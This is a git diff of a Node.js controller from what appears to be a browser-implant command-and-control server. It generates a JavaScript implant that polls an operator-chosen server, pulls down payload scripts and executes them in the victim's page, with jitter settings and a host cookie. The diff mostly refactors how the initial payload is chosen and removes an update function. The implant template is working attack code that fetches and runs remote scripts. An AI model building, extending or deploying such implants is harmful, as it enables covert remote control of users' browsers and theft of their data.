@@ -1,10 +1,11 @@
 const Implant = require("../models/Implant");
 const Payload = require("../models/Payload");
 const { createEvent } = require("./eventControllers");
+const { getPayloadById } = require("./payloadControllers");
 
 async function generateImplant(req, res) {
 
-    let { server, initialPayload, callbackInterval, minJitter, maxJitter, hostCookie } = req.body;
+    let { server, initialPayloadId, callbackInterval, minJitter, maxJitter, hostCookie } = req.body;
 
     // Validate URI for server
     server = server.replace(/\/+$/, "");
@@ -19,7 +20,7 @@ async function generateImplant(req, res) {
     // Minify this before production
     const template = `
     let commands = [];
-    let data = {}
+    let data = {};
     let id = "";
 
     function setData(name, value, type) {
@@ -87,8 +88,8 @@ async function generateImplant(req, res) {
                 }).then(response => response.json().then(responseData => {
                     commands = [];
                     responseData.forEach((payload) => {
-                        data = {}
-                        const script = payload.script
+                        data = {};
+                        const script = payload.script;
                         try {
                             if (script.toUpperCase().includes("ALERT")) { // Stops alert hanging the page
                                 setTimeout(function () {
@@ -132,6 +133,8 @@ async function generateImplant(req, res) {
     }());
     poll()
 `
+    const initialPayloadData = await getPayloadById(initialPayloadId);
+
     try {
         const implant = await Implant.create({
             server: server,
@@ -140,7 +143,7 @@ async function generateImplant(req, res) {
             minJitter: minJitter,
             maxJitter: maxJitter,
             hostCookie: hostCookie,
-            initialPayload: {name: "", payload: ""}
+            initialPayload: {name: initialPayloadData.name, payload: initialPayloadData.payload}
         })
         createEvent("Team Server", `Implant ${implant._id} created`, "info");
         return implant._id.toString();
@@ -177,23 +180,10 @@ async function deleteImplantById(req, res) {
     }
 }
 
-async function updateImplantInitialPayloadById(req, res) {    
-    Payload.findById(req.body.initialPayload).then((payload) => {
-        Implant.findByIdAndUpdate(req.params.id, {initialPayload: {id: payload._id.toString(), name: payload.name, payload: payload.payload}}).then((implant) => {
-            createEvent("Team Server", `Implant ${implant._id.toString()} was updated`, 'info');
-            res.status(200).json(implant);
-        }).catch((err) => {
-            res.status(400).json(err);
-        });
-    }).catch((err) => {
-        res.status(400).json(err);
-    });
-}
 
 module.exports = {
     generateImplant,
     getImplantById,
     getAllImplants,
-    deleteImplantById,
-    updateImplantInitialPayloadById
+    deleteImplantById
 };
